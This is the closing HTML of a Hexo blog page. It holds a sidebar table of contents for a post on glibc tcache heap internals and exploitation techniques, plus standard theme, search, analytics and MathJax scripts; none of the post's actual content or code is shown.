    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#t%E6%93%A6%E8%BD%A6"><span class="nav-number">1.</span> <span class="nav-text">T擦车</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95"><span class="nav-number">1.1.</span> <span class="nav-text">tcache数据结构与算法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#glibc-2.27"><span class="nav-number">1.1.1.</span> <span class="nav-text">glibc-2.27</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#datastructure"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">datastructure</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#algorithm"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">algorithm</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#malloc"><span class="nav-number">1.1.1.2.1.</span> <span class="nav-text">malloc</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#free"><span class="nav-number">1.1.1.2.2.</span> <span class="nav-text">free</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#glibc-2.31"><span class="nav-number">1.1.2.</span> <span class="nav-text">glibc-2.31</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#datastructure-1"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">datastructure</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#algorithm-1"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">algorithm</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#malloc-1"><span class="nav-number">1.1.2.2.1.</span> <span class="nav-text">malloc</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#free-1"><span class="nav-number">1.1.2.2.2.</span> <span class="nav-text">free</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exploit"><span class="nav-number">1.1.3.</span> <span class="nav-text">exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#use-after-free-%E5%AF%BC%E8%87%B4-tcache-entry-poisoning"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">Use After Free 导致
tcache entry poisoning</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#double-free%E9%80%A0%E6%88%90%E9%87%8D%E5%A4%8D%E5%BC%95%E7%94%A8"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">Double Free造成重复引用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tcache-overflow-%E5%AF%BC%E8%87%B4-tcache-entry-poisoning"><span class="nav-number">1.1.3.3.</span> <span class="nav-text">tcache overflow
导致 tcache entry poisoning</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tcache-entry-poisoning%E5%AF%BC%E8%87%B4tcache-metadata-poisoning"><span class="nav-number">1.1.3.4.</span> <span class="nav-text">tcache
entry poisoning导致tcache metadata poisoning</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#glibc-2.38"><span class="nav-number">1.1.4.</span> <span class="nav-text">glibc-2.38</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#datastructure-2"><span class="nav-number">1.1.4.1.</span> <span class="nav-text">datastructure</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#algorithm-2"><span class="nav-number">1.1.4.2.</span> <span class="nav-text">algorithm</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#key-init"><span class="nav-number">1.1.4.2.1.</span> <span class="nav-text">key init</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#malloc-2"><span class="nav-number">1.1.4.2.2.</span> <span class="nav-text">malloc</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#free-2"><span class="nav-number">1.1.4.2.3.</span> <span class="nav-text">free</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exploit-1"><span class="nav-number">1.1.4.3.</span> <span class="nav-text">exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#safe-linking-uaf"><span class="nav-number">1.1.4.3.1.</span> <span class="nav-text">[safe-linking] UAF</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#safe-linking-tcache-entry-poisoning"><span class="nav-number">1.1.4.3.2.</span> <span class="nav-text">[safe-linking] tcache entry
poisoning</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#safe-linking-metadata-poisoning-memory-leak"><span class="nav-number">1.1.4.3.3.</span> <span class="nav-text">[safe-linking]
metadata poisoning memory leak</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#glibc-2.35"><span class="nav-number">1.1.5.</span> <span class="nav-text">glibc-2.35</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn.college"><span class="nav-number">1.2.</span> <span class="nav-text">pwn.college</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#level1---uaf"><span class="nav-number">1.2.1.</span> <span class="nav-text">level1 - UAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level2--"><span class="nav-number">1.2.2.</span> <span class="nav-text">level2 -</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level9.0"><span class="nav-number">1.2.3.</span> <span class="nav-text">level9.0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level14.0"><span class="nav-number">1.2.4.</span> <span class="nav-text">level14.0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level14.1"><span class="nav-number">1.2.5.</span> <span class="nav-text">level14.1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level15.0"><span class="nav-number">1.2.6.</span> <span class="nav-text">level15.0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level16.0"><span class="nav-number">1.2.7.</span> <span class="nav-text">level16.0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level17.0"><span class="nav-number">1.2.8.</span> <span class="nav-text">level17.0</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="dustball"
      src="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
  <p class="site-author-name" itemprop="name">dustball</p>
  <div class="site-description" itemprop="description">dustland</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">37</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">dustball</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  
  <script data-pjax>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
<script src="/js/algolia-search.js"></script>












<script data-pjax>
if (document.querySelectorAll('pre.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
    mermaid.initialize({
      theme    : 'dark',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    });
  }, window.mermaid);
}
</script>


    <div id="pjax">
  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

    </div>
</body>
</html>
